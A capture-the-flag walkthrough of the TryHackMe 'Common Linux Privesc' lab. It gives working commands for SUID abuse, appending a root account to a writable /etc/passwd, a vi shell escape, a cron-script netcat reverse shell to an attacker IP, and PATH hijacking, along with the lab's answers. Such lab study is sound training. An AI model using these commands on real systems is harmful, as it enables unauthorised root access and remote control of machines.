# Common Linux Privesc

{% embed url="https://tryhackme.com/room/commonlinuxprivesc" %}
https://tryhackme.com/room/commonlinuxprivesc
{% endembed %}

## Task 4 Enumeration

#### First, lets SSH into the target machine, using the credentials user3:password. This is to simulate getting a foothold on the system as a normal privilege user.

```bash
ssh user3@10.10.86.129
wget http://10.6.9.176/LinEnum.sh
bash LinEnum.sh
```

#### **What is the target's hostname?**

```
hostname
```

![](<../../.gitbook/assets/Screenshot from 2020-09-06 11-31-02.png>)

{% hint style="success" %}
`polobox`
{% endhint %}

#### **Look at the output of /etc/passwd how many "user\[x]" are there on the system?**

```
grep '^user' /etc/passwd
```

![](<../../.gitbook/assets/Screenshot from 2020-09-06 11-42-17.png>)

{% hint style="success" %}
`8`
{% endhint %}

#### **How many available shells are there on the system?**

```
cat /etc/shells
```

![](<../../.gitbook/assets/Screenshot from 2020-09-06 11-32-57.png>)

{% hint style="success" %}
`4`
{% endhint %}

#### **What is the name of the bash script that is set to run every 5 minutes by cron?**

```
cat /etc/crontab
```

![](<../../.gitbook/assets/Screenshot from 2020-09-06 11-33-41.png>)

{% hint style="success" %}
`autoscript.sh`
{% endhint %}

#### **What critical file has had its permissions changed to allow some users to write to it?**

```
ls -l /etc/passwd
```

![](<../../.gitbook/assets/Screenshot from 2020-09-06 11-46-23.png>)

{% hint style="success" %}
`/etc/passwd`
{% endhint %}

## Task 5 Abusing SUID/GUID Files

#### **What is the path of the file in user3's directory that stands out to you?**

```
find /home/user3 -type f -perm -4000 2>/dev/null
```

![](<../../.gitbook/assets/Screenshot from 2020-09-06 11-53-47.png>)

{% hint style="success" %}
`/home/user3/shell`
{% endhint %}

#### We know that "shell" is an SUID bit file, therefore running it will run the script as a root user! Lets run it! Congratulations! You should now have a shell as root user, well done!

```bash
./shell
```

## Task 6 Exploiting Writeable /etc/passwd

```bash
cat /etc/group | grep root
```

![](<../../.gitbook/assets/Screenshot from 2022-04-22 07-06-09.png>)

#### Having read the information above, what direction privilege escalation is this attack?

{% hint style="success" %}
`vertical`
{% endhint %}

#### Before we add our new user, we first need to create a compliant password hash to add!

```
openssl passwd -1 -salt new 123
```

![](<../../.gitbook/assets/Screenshot from 2020-09-06 12-04-10.png>)

#### What is the hash created by using this command with the salt, **"new"** and the password **"123"**?

{% hint style="success" %}
`$1$new$p7ptkEKU1HnaHpRtzNizS1`
{% endhint %}

#### Great! Now we need to take this value, and create a new root user account. What would the /etc/passwd entry look like for a root user with the username "new" and the password hash we created before?

{% hint style="success" %}
`new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash`
{% endhint %}

#### Great! Now you've got everything you need. Just add that entry to the end of the /etc/passwd file!

```bash
echo 'new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd
```

#### Now, use **"su"** to login as the "new" account, and then enter the password. If you've done everything correctly- you should be greeted by a root prompt!

```
su - new
```

![](<../../.gitbook/assets/Screenshot from 2020-09-06 12-09-47.png>)

## Task 7 Escaping Vi Editor

#### **Let's use the "sudo -l" command, what does this user require (or not require) to run vi as root?**

```
sudo -l
```

![](<../../.gitbook/assets/Screenshot from 2020-09-06 12-17-36.png>)

{% hint style="success" %}
`NOPASSWD`
{% endhint %}

#### So, all we need to do is open vi as root, by typing **"sudo vi"** into the terminal.

```bash
sudo /usr/bin/vi
```

#### Now, type **":!sh"** to open a shell!

```
:!sh
```

![](<../../.gitbook/assets/Screenshot from 2020-09-06 12-21-44.png>)

## Task 8 Exploiting Crontab

#### Now, on our host machine- let's create a payload for our cron exploit using msfvenom.

#### **What is the flag to specify a payload in msfvenom?**

{% hint style="success" %}
`-p`
{% endhint %}

#### **Create a payload using: "msfvenom -p cmd/unix/reverse\_netcat lhost=LOCALIP lport=8888 R"**

```
msfvenom -p cmd/unix/reverse_netcat LHOST=10.9.101.193
```

![](<../../.gitbook/assets/Screenshot from 2020-09-06 12-39-36.png>)

#### **What directory is the "autoscript.sh" under?**

{% hint style="success" %}
`/home/user4/Desktop`
{% endhint %}

#### Let's replace the contents of the file with our payload

```
echo 'mkfifo /tmp/blkdu; nc 10.9.101.193 4444 0</tmp/blkdu | /bin/sh >/tmp/blkdu 2>&1; rm /tmp/blkdu' > Desktop/autoscript.sh
```

#### **After copying the code into autoscript.sh file we wait for cron to execute the file, and start our netcat listener**

```
nc -nvlp 4444
```

![](<../../.gitbook/assets/Screenshot from 2020-09-06 13-16-17.png>)

## Task 9 Exploiting PATH Variable

#### **Let's go to user5's home directory, and run the file "script". What command do we think that it's executing?**

```
./script
```

![](<../../.gitbook/assets/Screenshot from 2020-09-06 13-21-16.png>)

{% hint style="success" %}
`ls`
{% endhint %}

#### Now we know what command to imitate, let's change directory to **"tmp"**. Now we're inside tmp, let's create an imitation executable. The format for what we want to do is:

#### **What would the command look like to open a bash shell, writing to a file with the name of the executable we're imitating**

{% hint style="success" %}
`echo "/bin/bash" > ls`
{% endhint %}

#### We need to make it an executable. What command do we execute to do this?

{% hint style="success" %}
`chmod +x ls`
{% endhint %}

#### Now, we need to change the PATH variable, so that it points to the directory where we have our imitation **"ls"** stored! We do this using the command **"export PATH=/tmp:$PATH"**

#### Note, this will cause you to open a bash prompt every time you use **"ls"**. If you need to use **"ls"** before you finish the exploit, use **"/bin/ls"** where the real **"ls"** executable is.

#### Now, change directory back to user5's home directory.

#### Now, Run the "script" file again, you should be sent into a root bash prompt!

```bash
PATH=/tmp:$PATH ./sript
```

![](<../../.gitbook/assets/Screenshot from 2020-09-06 13-27-13.png>)

## ****:link: **Support Material**

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md" %}

{% embed url="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html" %}

{% embed url="https://payatu.com/guide-linux-privilege-escalation" %}

****\
****

### **** ****
